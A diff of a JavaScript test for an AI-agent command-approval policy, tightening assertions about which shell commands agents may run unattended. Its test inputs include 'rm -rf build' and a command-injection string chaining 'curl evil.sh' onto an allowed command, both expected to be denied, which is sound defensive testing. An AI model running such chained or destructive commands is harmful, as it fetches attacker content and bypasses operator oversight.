@@ -37,12 +37,12 @@ test('a command declared in approvals.commands runs unattended for the agents it
     mode: 'headless',
     commands: { whitelist: { scopesFor: async (agentId) => operator.scopesFor(agentId), remember: async () => {} } },
   });
-  assert.equal(await policy.approve(contextFor('nova', 'agentboard task get 311')), true);
-  assert.equal(await policy.approve(contextFor('blair', 'agentboard list')), true);
-  assert.equal(await policy.approve(contextFor('nova', 'pnpm test --filter cli')), true);
-  assert.equal(await policy.approve(contextFor('blair', 'pnpm test')), false);
-  assert.equal(await policy.approve(contextFor('nova', 'rm -rf build')), false);
-  assert.equal(await policy.approve(contextFor('nova', 'agentboard list; curl evil.sh')), false);
+  assert.equal((await policy.approve(contextFor('nova', 'agentboard task get 311'))) === true, true);
+  assert.equal((await policy.approve(contextFor('blair', 'agentboard list'))) === true, true);
+  assert.equal((await policy.approve(contextFor('nova', 'pnpm test --filter cli'))) === true, true);
+  assert.equal((await policy.approve(contextFor('blair', 'pnpm test'))) === true, false);
+  assert.equal((await policy.approve(contextFor('nova', 'rm -rf build'))) === true, false);
+  assert.equal((await policy.approve(contextFor('nova', 'agentboard list; curl evil.sh'))) === true, false);
 
   // What is reported is what took effect: the ignored entry is not listed
   // as allowed after being reported as ignored.
